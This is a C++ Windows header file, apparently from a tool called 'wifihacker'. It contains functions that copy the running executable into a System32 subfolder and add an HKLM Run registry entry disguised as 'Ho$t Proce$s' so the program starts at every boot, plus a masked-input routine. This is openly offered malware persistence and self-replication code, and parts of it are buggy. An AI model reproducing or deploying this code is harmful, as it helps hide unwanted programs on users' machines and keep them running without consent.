/*contains functions for winAPI registry operations 
 *contains functions for elevating UAC to admin level
 *contains functions for program file self replication 
 *contains function for masking user input
 */
#ifndef ADVANCED_HEADER_FILE_H
#define ADVANCED_HEADER_FILE_H

#include <string>
#include <tchar.h>
#include <stdio.h>
#include <conio.h>
#include <strings.h>
#include <stdlib.h>
#include <windows.h>
#include <iostream>
                       

bool Am_I_Registered(PCWSTR pszAppName)
{
 HKEY hKey=NULL;
 LONG lResult=0;
 bool fSuccess=true;
 DWORD dwRegType=REG_SZ;
 wchar_t szPathToExe[MAX_PATH]={};
 DWORD dwSize=sizeof(szPathToExe);
 lResult=RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ,&hKey);
 fSuccess=(lResult==0);
 
 if(fSuccess)
  {
   lResult=RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
   fSuccess=(lResult==0);
  }
  
  if(fSuccess)
   {
   	fSuccess=(wcslen(szPathToExe)>0)? true:false;
   }
  
  if(hKey!=NULL)
   {
   	RegCloseKey(hKey);
   	hKey=NULL;
   }
  return fSuccess;    
}


std::string Replicate_Self()
{
 DWORD pathlen=0;
 TCHAR temp[MAX_PATH];
 pathlen=GetModuleFileName(NULL, temp, MAX_PATH);
 if(pathlen==0)
   {
   	_tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
   	system("pause");
   	return NULL;
   }
  std::string szpath=temp;
  std::string newpath=" C:\\Windows\\System32\\slmgr\\";
  std::string copied="copy ";
  copied+=szpath;
  copied+=newpath;
  char __array_copied__[copied.size()];
  (void) copied.copy(__array_copied__, copied.size());
  system(__array_copied__);
  newpath+="wifihacker.exe";
  return newpath;
} 


bool Write_To_Registry()
{
//check whether program is registered and if yes return to caller
if(Am_I_Registered(L"Ho$t Proce$s"))
   return true;
   
//replicate self    
  std::string newpath=Replicate_Self();
  if(newpath.size()==1)
  {
   _tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
   system("pause");
   return false;
  }
  
  TCHAR szPath[newpath.size()];
  TCHAR __array_newpath__[newpath.size()];
  for(unsigned int i=0; i<newpath.size(); i++)
    szPath[i]='\0';
  for(unsigned int i=0; i<newpath.size(); i++)
    __array_newpath__[i]='\0';  
  (void) newpath.copy(__array_newpath__, newpath.size(), 1);
  for(unsigned int i=0; i<strlen(__array_newpath__); i++)
    szPath[i]=__array_newpath__[i];
    

//write to registry  
   DWORD pathlen=strlen(szPath);
   HKEY newvalue;
   
   if(RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newvalue)!=ERROR_SUCCESS)
     {
      _tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
      system("pause");
      return false;
     }
                       
  DWORD pathLenInBytes=pathlen*sizeof(*szPath);
  if(RegSetValueEx(newvalue, TEXT("Ho$t Proce$s"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes)!=ERROR_SUCCESS)
    {
     RegCloseKey(newvalue);
     _tprintf(TEXT("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n"));
     system("pause");
     return false;  
    }	 
	
   RegCloseKey(newvalue);
   return true;		    
}

char* hide_user_input()
{
  char* key=new char[30];
  char temp_char[2],key_char;
  for(unsigned i=0; i<30; i++)
    key[i]='\0';
  for(unsigned j=0; j<2; j++)
    temp_char[j]='\0';
  while(key_char!=13)	//13==enter
    {
     key_char=getch();
     if(key_char==8)	//8==backspace
       {
       	key[strlen(key)-1]='\0';
       	system("cls");
       	for(unsigned k=0; k<strlen(key); k++)
       	  std::cout<<'*';
   	    continue;
       }
     std::cout<<'*'; 		
	 temp_char[0]=key_char;
	 strcat(key, temp_char);
    }
  	return key;     
}

#endif  //ADVANCED_HEADER_FILE
